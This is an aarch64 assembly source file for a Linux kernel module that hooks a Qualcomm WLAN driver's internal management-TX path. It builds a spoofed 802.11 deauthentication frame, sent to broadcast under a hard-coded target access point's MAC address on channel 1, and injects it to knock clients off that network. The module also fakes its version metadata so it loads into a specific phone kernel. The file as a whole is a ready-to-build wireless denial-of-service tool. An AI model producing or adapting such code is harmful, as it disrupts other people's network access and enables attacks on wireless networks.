/*
 * wmatx3.S - Send deauth via wma_mgmt_unified_cmd_send (WMI path)
 *
 * Signature from source:
 *   QDF_STATUS wma_mgmt_unified_cmd_send(
 *       struct wlan_objmgr_vdev *vdev,  // x0
 *       qdf_nbuf_t buf,                 // x1
 *       uint32_t desc_id,               // w2
 *       void *mgmt_tx_params)           // x3 = struct wmi_mgmt_params *
 *
 * struct wmi_mgmt_params layout (aarch64):
 *   0x00: void *tx_frame       (qdf_nbuf_t)
 *   0x08: uint16_t frm_len
 *   0x0A: uint8_t vdev_id
 *   0x0B: uint8_t tx_type
 *   0x0C: uint16_t chanfreq
 *   0x0E: uint16_t desc_id
 *   0x10: void *pdata           (frame data pointer)
 *   0x18: uint8_t *macaddr
 *   0x20: void *qdf_ctx         (qdf_device_t for DMA mapping)
 *   0x28: struct tx_send_params  (8 bytes, two uint32_t bitfields)
 *   0x30: bool tx_params_valid
 *   0x31: uint8_t use_6mbps
 *   0x34: uint32_t tx_flags
 *   0x38: int8_t peer_rssi
 *   0x39: uint8_t mlo_link_agnostic
 *   0x3A: uint8_t band
 *   Total ~0x40 bytes
 *
 * WMA context:
 *   wma[0x000] = wmi_handle
 *   wma[0x2A0] = interfaces array
 *   interfaces[0][0x010] = vdev pointer
 *   interface stride = 0x9130
 *
 * Build: as -o wmatx3.o wmatx3.S && ld -r -o wmatx3.ko wmatx3.o
 */

.section .gnu.linkonce.this_module, "aw"
.balign 256
__this_module:
    .fill 24, 1, 0
    .asciz "kfind"
    .fill 50, 1, 0
    .fill 256, 1, 0
    .quad init_module
    .fill 440, 1, 0
    .quad cleanup_module
    .fill 40, 1, 0

.section .modinfo, "a"
    .asciz "vermagic=4.19.81-perf+ SMP preempt mod_unload modversions aarch64"
    .asciz "name=kfind"
    .asciz "license=GPL"

.section __versions, "a"
    .quad 0
    .asciz "module_layout"
    .balign 64, 0
    .quad 0
    .asciz "printk"
    .balign 64, 0
    .quad 0
    .asciz "kallsyms_lookup_name"
    .balign 64, 0

.section .rodata, "a"
str_cds:
    .asciz "cds_get_context"
str_wma_send:
    .asciz "wma_mgmt_unified_cmd_send"
str_skballoc:
    .asciz "__alloc_skb"
str_skbput:
    .asciz "skb_put"
str_kfree_skb:
    .asciz "kfree_skb"
fmt_init:
    .asciz "wmatx3: init - WMI mgmt TX\n"
fmt_sym:
    .asciz "wmatx3: cds=%px send=%px skballoc=%px skbput=%px kfree=%px\n"
fmt_wma:
    .asciz "wmatx3: wma=%px wmi=%px ifaces=%px\n"
fmt_scan:
    .asciz "wmatx3: scan[0x%03x]=%px\n"
fmt_scan_a:
    .asciz "wmatx3: A[0x%03x]=%px\n"
fmt_scan_b:
    .asciz "wmatx3: B[0x%03x]=%px\n"
fmt_vdev:
    .asciz "wmatx3: vdev=%px\n"
fmt_skb:
    .asciz "wmatx3: skb=%px data=%px\n"
fmt_params:
    .asciz "wmatx3: params: tx_frame=%px frm_len=%d vdev_id=%d chanfreq=%d pdata=%px qdf_ctx=%px\n"
fmt_call:
    .asciz "wmatx3: calling wma_mgmt_unified_cmd_send(vdev=%px, buf=%px, desc_id=%d)\n"
fmt_res:
    .asciz "wmatx3: result = %d (0=success)\n"
fmt_err:
    .asciz "wmatx3: ERROR: %s\n"
str_sym_err:
    .asciz "symbol lookup failed"
str_wma_err:
    .asciz "wma context NULL"
str_qdf_err:
    .asciz "qdf_ctx NULL"
str_vdev_err:
    .asciz "vdev pointer NULL"
str_skb_err:
    .asciz "skb allocation failed"
fmt_done:
    .asciz "wmatx3: done\n"

/* MAC address of target AP */
.balign 4
target_mac:
    .byte 0x04,0x67,0x61,0xd6,0xdc,0x92

/* Deauth frame: 26 bytes */
.balign 4
deauth_frame:
    .short 0x00C0       /* FC: deauth */
    .short 0x0000       /* Duration */
    .byte 0xff,0xff,0xff,0xff,0xff,0xff  /* DA: broadcast */
    .byte 0x04,0x67,0x61,0xd6,0xdc,0x92 /* SA: target AP */
    .byte 0x04,0x67,0x61,0xd6,0xdc,0x92 /* BSSID: target AP */
    .short 0x0000       /* Seq ctrl */
    .short 0x0007       /* Reason: Class 3 frame */
deauth_end:
.equ FLEN, deauth_end - deauth_frame   /* = 26 */

.section .init.text, "ax"
.globl init_module
.type init_module, %function
init_module:
    stp x29, x30, [sp, #-176]!
    mov x29, sp
    stp x19, x20, [sp, #16]
    stp x21, x22, [sp, #32]
    stp x23, x24, [sp, #48]
    stp x25, x26, [sp, #64]
    stp x27, x28, [sp, #80]
    /* sp+96..sp+160: struct wmi_mgmt_params (0x40 = 64 bytes) */
    /* sp+160..sp+168: spare */

    adrp x0, fmt_init
    add x0, x0, :lo12:fmt_init
    bl printk

    /* ========== Resolve symbols ========== */
    adrp x0, str_cds
    add x0, x0, :lo12:str_cds
    bl kallsyms_lookup_name
    cbz x0, .Lsymerr
    mov x19, x0                /* x19 = cds_get_context */

    adrp x0, str_wma_send
    add x0, x0, :lo12:str_wma_send
    bl kallsyms_lookup_name
    cbz x0, .Lsymerr
    mov x20, x0                /* x20 = wma_mgmt_unified_cmd_send */

    adrp x0, str_skballoc
    add x0, x0, :lo12:str_skballoc
    bl kallsyms_lookup_name
    cbz x0, .Lsymerr
    mov x21, x0                /* x21 = __alloc_skb */

    adrp x0, str_skbput
    add x0, x0, :lo12:str_skbput
    bl kallsyms_lookup_name
    cbz x0, .Lsymerr
    mov x22, x0                /* x22 = skb_put */

    adrp x0, str_kfree_skb
    add x0, x0, :lo12:str_kfree_skb
    bl kallsyms_lookup_name
    cbz x0, .Lsymerr
    mov x23, x0                /* x23 = kfree_skb */

    /* Print resolved symbols */
    adrp x0, fmt_sym
    add x0, x0, :lo12:fmt_sym
    mov x1, x19
    mov x2, x20
    mov x3, x21
    mov x4, x22
    mov x5, x23
    bl printk

    /* ========== Get WMA context ========== */
    mov w0, #54               /* QDF_MODULE_ID_WMA */
    blr x19
    cbz x0, .Lwmaerr
    mov x24, x0               /* x24 = wma handle */

    /* Read wma->wmi_handle [0x000] and wma->interfaces [0x2A0] */
    ldr x25, [x24, #0]        /* x25 = wmi_handle */
    ldr x26, [x24, #0x2A0]    /* x26 = interfaces array */

    adrp x0, fmt_wma
    add x0, x0, :lo12:fmt_wma
    mov x1, x24
    mov x2, x25
    mov x3, x26
    bl printk

    /* ========== Get qdf_ctx via cds_get_context(QDF_MODULE_ID_QDF_DEVICE=64) ========== */
    mov w0, #64               /* QDF_MODULE_ID_QDF_DEVICE */
    blr x19                    /* cds_get_context(64) */
    cbz x0, .Lqdferr           /* qdf_ctx NULL check */
    mov x27, x0                /* x27 = qdf_ctx (qdf_device_t) */

    /* ========== Get vdev from interfaces[0] ========== */
    /* interfaces[0][0x010] = wlan_objmgr_vdev* (confirmed in kprobe5) */
    ldr x28, [x26, #0x010]    /* interfaces[0][0x010] */

    adrp x0, fmt_vdev
    add x0, x0, :lo12:fmt_vdev
    mov x1, x28
    bl printk

    cbz x28, .Lvdeverr
    /* x28 = vdev pointer (struct wlan_objmgr_vdev *) */

    /* ========== Allocate skb ========== */
    /* __alloc_skb(size, gfp_mask, flags, node) */
    mov w0, #64               /* size = 64 bytes */
    mov w1, #0xCC0             /* GFP_KERNEL = __GFP_RECLAIM|__GFP_IO|__GFP_FS = 0xCC0 */
    mov w2, #0                 /* flags = 0 */
    mov w3, #-1                /* NUMA_NO_NODE = -1 */
    blr x21                   /* __alloc_skb(64, GFP_KERNEL, 0, -1) */
    cbz x0, .Lskberr
    mov x25, x0               /* x25 = skb (qdf_nbuf_t) */

    /* skb_put(skb, FLEN) to set len and get data pointer */
    mov x0, x25
    mov w1, #FLEN
    blr x22                   /* returns pointer to data */
    mov x26, x0               /* x26 = data pointer within skb */

    adrp x0, fmt_skb
    add x0, x0, :lo12:fmt_skb
    mov x1, x25
    mov x2, x26
    bl printk

    /* ========== Copy deauth frame into skb data ========== */
    adrp x8, deauth_frame
    add x8, x8, :lo12:deauth_frame
    mov x9, x26
    mov w10, #FLEN
.Lcopy:
    cbz w10, .Lcopy_done
    ldrb w11, [x8], #1
    strb w11, [x9], #1
    sub w10, w10, #1
    b .Lcopy
.Lcopy_done:

    /* ========== Build struct wmi_mgmt_params on stack ========== */
    /* Zero the struct first (64 bytes at sp+96) */
    add x8, sp, #96
    stp xzr, xzr, [x8, #0]     /* 0x00..0x0F */
    stp xzr, xzr, [x8, #16]    /* 0x10..0x1F */
    stp xzr, xzr, [x8, #32]    /* 0x20..0x2F */
    stp xzr, xzr, [x8, #48]    /* 0x30..0x3F */

    /* tx_frame [0x00] = skb */
    str x25, [x8, #0x00]

    /* frm_len [0x08] = 26 */
    mov w0, #FLEN
    strh w0, [x8, #0x08]

    /* vdev_id [0x0A] = 0 */
    strb wzr, [x8, #0x0A]

    /* tx_type [0x0B] = 0 */
    strb wzr, [x8, #0x0B]

    /* chanfreq [0x0C] = 2412 (channel 1, target AP frequency) */
    mov w0, #2412
    strh w0, [x8, #0x0C]

    /* desc_id [0x0E] = 1 (will be overwritten by function anyway) */
    mov w0, #1
    strh w0, [x8, #0x0E]

    /* pdata [0x10] = data pointer in skb */
    str x26, [x8, #0x10]

    /* macaddr [0x18] = pointer to target MAC */
    adrp x0, target_mac
    add x0, x0, :lo12:target_mac
    str x0, [x8, #0x18]

    /* qdf_ctx [0x20] = cds_get_context(QDF_MODULE_ID_QDF_DEVICE) */
    str x27, [x8, #0x20]

    /* tx_param [0x28] = 0,0 (already zeroed) */
    /* tx_params_valid [0x30] = 0 (false - let firmware decide) */
    /* use_6mbps [0x31] = 0 */
    /* tx_flags [0x34] = 0 */
    /* peer_rssi [0x38] = 0 */

    /* Print params for verification */
    adrp x0, fmt_params
    add x0, x0, :lo12:fmt_params
    ldr x1, [x8, #0x00]       /* tx_frame */
    ldrh w2, [x8, #0x08]      /* frm_len */
    ldrb w3, [x8, #0x0A]      /* vdev_id */
    ldrh w4, [x8, #0x0C]      /* chanfreq */
    ldr x5, [x8, #0x10]       /* pdata */
    ldr x6, [x8, #0x20]       /* qdf_ctx */
    bl printk

    /* ========== Call wma_mgmt_unified_cmd_send ========== */
    adrp x0, fmt_call
    add x0, x0, :lo12:fmt_call
    mov x1, x28                /* vdev */
    mov x2, x25                /* buf */
    mov w3, #1                 /* desc_id */
    bl printk

    mov x0, x28                /* vdev */
    mov x1, x25                /* skb/nbuf */
    mov w2, #1                 /* desc_id = 1 */
    add x3, sp, #96            /* pointer to struct on stack */
    blr x20                    /* wma_mgmt_unified_cmd_send */
    mov w27, w0                /* save result */

    adrp x0, fmt_res
    add x0, x0, :lo12:fmt_res
    mov w1, w27
    bl printk

    /* If non-zero, skb was not consumed - free it */
    cbnz w27, .Lfree_skb
    b .Lok
.Lfree_skb:
    mov x0, x25
    blr x23                    /* kfree_skb */
    b .Lok

.Lsymerr:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    adrp x1, str_sym_err
    add x1, x1, :lo12:str_sym_err
    bl printk
    mov w0, #-1
    b .Lret

.Lwmaerr:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    adrp x1, str_wma_err
    add x1, x1, :lo12:str_wma_err
    bl printk
    mov w0, #-1
    b .Lret

.Lqdferr:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    adrp x1, str_qdf_err
    add x1, x1, :lo12:str_qdf_err
    bl printk
    mov w0, #-1
    b .Lret

.Lvdeverr:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    adrp x1, str_vdev_err
    add x1, x1, :lo12:str_vdev_err
    bl printk
    mov w0, #-1
    b .Lret

.Lskberr:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    adrp x1, str_skb_err
    add x1, x1, :lo12:str_skb_err
    bl printk
    mov w0, #-1
    b .Lret

.Lok:
    adrp x0, fmt_done
    add x0, x0, :lo12:fmt_done
    bl printk
    mov w0, #0

.Lret:
    ldp x27, x28, [sp, #80]
    ldp x25, x26, [sp, #64]
    ldp x23, x24, [sp, #48]
    ldp x21, x22, [sp, #32]
    ldp x19, x20, [sp, #16]
    ldp x29, x30, [sp], #176
    ret

.section .exit.text, "ax"
.globl cleanup_module
.type cleanup_module, %function
cleanup_module:
    ret

.section .note.Linux, "a", @note
    .long 6
    .long 0
    .long 0x100
    .asciz "Linux"
    .balign 4

.section .plt, "ax"
    .balign 8
    .space 8
.section .init.plt, "ax"
    .balign 8
    .space 8
.section .text.ftrace_trampoline, "ax"
    .balign 8
